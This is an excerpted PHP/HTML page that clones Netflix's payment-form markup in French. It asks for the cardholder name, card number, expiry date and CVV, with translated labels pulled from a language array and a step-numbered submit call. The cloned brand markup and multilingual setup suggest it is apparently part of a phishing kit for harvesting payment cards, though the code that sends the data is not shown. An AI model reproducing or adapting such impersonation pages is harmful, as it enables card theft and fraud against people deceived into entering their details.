					...
					<div class="centerContainer firstLoad">
						<div data-uia="payment-form">
								...
								<div>
									<div class="stepHeader-container" data-uia="header">
										<div class="stepHeader" role="status">
											<h1 class="stepTitle" data-uia="stepTitle"><?php echo $traduce["$lang"]["cc_title"];?></h1></div>
									</div>
									<div class="contextContainer"></div>
								</div>
								<div class="fieldContainer"> <span class="logos logos-block" data-uia="cardLogos-comp" aria-label="Nous acceptons VISA, MASTERCARD et AMEX.">
										<img src="./assets/2.png" alt="VISA" class="logoIcon VISA css-kg1rox epojmy00" data-uia="logoIcon-VISA">
										<img src="./assets/1.png" alt="MASTERCARD" class="logoIcon MASTERCARD css-kg1rox epojmy00" data-uia="logoIcon-MASTERCARD">
										<img src="./assets/4.png" alt="AMEX" class="logoIcon AMEX css-kg1rox epojmy00" data-uia="logoIcon-AMEX">
									</span>
													...
													<div data-uia="field-creditCardNumber+container" class="nfInput nfInputOversize">
														<div class="nfInputPlacement">
															<label class="input_id" placeholder="creditCardNumber">
																<input type="text" data-uia="field-creditCardNumber" placeholder="<?php echo $traduce["$lang"]["cc_name"];?>" name="creditCardNumber" class="nfTextField" id="ccn" value="" tabindex="0" autocomplete="cc-number" maxlength="19" minlength="12" dir="" placeholder="">
															</label>
														</div>
													</div>
												</div>
											...
											<li data-uia="field-creditCardNumber+wrapper" class="nfFormSpace">
												<div class="cardNumberContainer">
													<div data-uia="field-creditCardNumber+container" class="nfInput nfInputOversize">
														<div class="nfInputPlacement">
															<label class="input_id" placeholder="creditCardNumber">
																<input type="tel" data-uia="field-creditCardNumber" placeholder="<?php echo $traduce["$lang"]["cc_num"];?>" name="creditCardNumber" class="nfTextField" id="cc" value="" tabindex="0" autocomplete="cc-number" maxlength="19" minlength="12" dir="" placeholder="">
															</label>
														</div>
													</div>
												</div>
												...
												<div data-uia="field-creditExpirationMonth+container" class="nfInput nfInputOversize">
													<div class="nfInputPlacement">
														<label class="input_id" placeholder="creditExpirationMonth">
															<input type="tel" data-uia="field-creditExpirationMonth" name="creditExpirationMonth" class="nfTextField" id="exp" value="" tabindex="0" autocomplete="cc-exp" dir="" placeholder="<?php echo $traduce["$lang"]["cc_exp"];?>">
												...
												<div data-uia="field-creditCardSecurityCode+container" class="nfInput nfInputOversize tooltip">
													<div class="nfInputPlacement">
														<label class="input_id" placeholder="creditCardSecurityCode">
															<input type="tel" data-uia="field-creditCardSecurityCode" name="creditCardSecurityCode" class="nfTextField" id="ccv" value="" tabindex="0" autocomplete="cc-csc" maxlength="4" minlength="3" dir="" placeholder="<?php echo $traduce["$lang"]["cc_cvv"];?>">
														</label>
													</div>
												</div>
											</li>
							...
							<div class="submitBtnContainer">
								<button type="submit" autocomplete="off" tabindex="0" class="nf-btn nf-btn-primary nf-btn-solid nf-btn-oversize" onclick="submit('3')" data-uia="action-submit-payment" placeholder=""><?php echo $traduce["$lang"]["cc_button"];?></button>
							</div>
						</div>
					</div>
				</div>
